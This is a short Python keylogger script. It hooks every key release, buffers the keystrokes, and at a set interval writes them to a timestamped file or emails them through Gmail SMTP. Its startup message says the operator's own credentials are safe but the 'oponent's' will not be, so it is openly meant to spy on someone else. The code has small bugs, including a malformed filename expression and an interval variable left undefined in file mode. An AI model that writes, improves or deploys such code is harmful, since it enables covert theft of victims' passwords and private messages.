import keyboard
import smtplib
from threading import Timer
from datetime import datetime


class Keylogger:
    def __init__(self, interval):
        self.interval = interval
        self.log = ""
        self.startTime = datetime.now()
        self.endTime = datetime.now()

    def keyEvents(self, event):
        name = event.name
        if len(name) > 1:
            if name == "space": #space keyboard event
                name = " "
            elif name == "enter":
                name = "\n"
            elif name == "[BACKSPACE]":
                name = "\b"
            elif name == "decimal":
                name = "."
            name = name.replace(" ", "_")  #replace all spaces
            name = name.replace("[", "").replace("]","")
        self.log += name  #add for every char
        
    def updateFilename(self):
        startTime_str = str(self.startTime)[:-7].replace(" ", "-").replace(":", "")
        endTime_str = str(self.endTime)[:-7].replace(" ", "-").replace(":", "")
        self.filename = f"keylog-{startTime_str}_{endTime_str}"

    def reportToFile(self):
        with open(f"{self.filename.txt}", "w") as f:
            print(self.log, file=f)
        print(f"[+] Saved {self.filename}.txt")
    
    def sendEmail(self, email, password, message):
        server = smtplib.SMTP(host="smtp.gmail.com", port=587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email, email, message)
        server.quit()

    def report(self):
        if self.log:
            self.endTime = datetime.now()
            self.updateFilename()
            if METHOD == "1":
                self.reportToFile()
            elif METHOD == "2":
                self.sendEmail(ADDRESS, PASSWORD, self.log)
            else:
                print("invalid")
                exit(0)
            self.startTime = datetime.now()
        self.log = ""
        timer = Timer(interval=self.interval, function=self.report)
        timer.daemon = True
        timer.start()

    def start(self):  #on key released
        self.startTime = datetime.now()
        keyboard.on_release(callback=self.keyEvents)
        self.report()
        keyboard.wait()

if __name__ == "__main__":
    print("Welcome! Your email and password will be safe but your oponent's won't")
    METHOD = input("Enter 1 to save keylogs as file, 2 to send as email: ")
    if (METHOD == "2"):
        ADDRESS = input("Enter email: ")
        PASSWORD = input("Enter password: ")
        REPORT_INTERVAL = int(input("Enter report interval in seconds: "))
    keylogger = Keylogger(interval=REPORT_INTERVAL) #send 
    keylogger.start()